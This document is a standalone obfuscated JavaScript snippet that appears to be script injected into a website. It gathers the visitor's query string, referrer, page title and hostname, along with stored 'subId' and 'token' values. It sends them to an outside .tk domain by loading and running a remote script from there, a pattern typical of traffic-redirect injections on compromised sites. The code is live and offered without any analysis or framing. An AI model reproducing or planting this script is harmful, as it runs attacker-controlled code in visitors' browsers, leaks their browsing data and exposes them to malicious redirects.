  (function() {
    var name = '_GFvygrvq77msPsTz';
    if (!window._GFvygrvq77msPsTz) {
        window._GFvygrvq77msPsTz = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://paygambfasliling.tk/jog-fit',
            P_PATH: 'https://paygambfasliling.tk/fec84ce/postback',
        };
    }
    const _4JmRN2TTz6LRr5Yk = localStorage.getItem('config');
    if (typeof _4JmRN2TTz6LRr5Yk !== 'undefined' && _4JmRN2TTz6LRr5Yk !== null) {
        var _Y3YsG9FDtbhtRRZm = JSON.parse(_4JmRN2TTz6LRr5Yk);
        var _YSrrwSmFY3x2TbTF = Math.round(+new Date()/1000);
        if (_Y3YsG9FDtbhtRRZm.created_at + window._GFvygrvq77msPsTz.ttl < _YSrrwSmFY3x2TbTF) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _v2mrmR1zDYgjWhJg = localStorage.getItem('subId');
    var _HYprRW3r9FLYNPJM = localStorage.getItem('token');
    var _JF7BgfcM59qBxYP5 = '?return=js.client';
        _JF7BgfcM59qBxYP5 += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _JF7BgfcM59qBxYP5 += '&se_referrer=' + encodeURIComponent(document.referrer);
        _JF7BgfcM59qBxYP5 += '&default_keyword=' + encodeURIComponent(document.title);
        _JF7BgfcM59qBxYP5 += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _JF7BgfcM59qBxYP5 += '&name=' + encodeURIComponent(name);
        _JF7BgfcM59qBxYP5 += '&host=' + encodeURIComponent(window._GFvygrvq77msPsTz.R_PATH);
    if (typeof _v2mrmR1zDYgjWhJg !== 'undefined' && _v2mrmR1zDYgjWhJg && window._GFvygrvq77msPsTz.unique) {
        _JF7BgfcM59qBxYP5 += '&sub_id=' + encodeURIComponent(_v2mrmR1zDYgjWhJg);
    }
    if (typeof _HYprRW3r9FLYNPJM !== 'undefined' && _HYprRW3r9FLYNPJM && window._GFvygrvq77msPsTz.unique) {
        _JF7BgfcM59qBxYP5 += '&token=' + encodeURIComponent(_HYprRW3r9FLYNPJM);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._GFvygrvq77msPsTz.R_PATH + _JF7BgfcM59qBxYP5;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
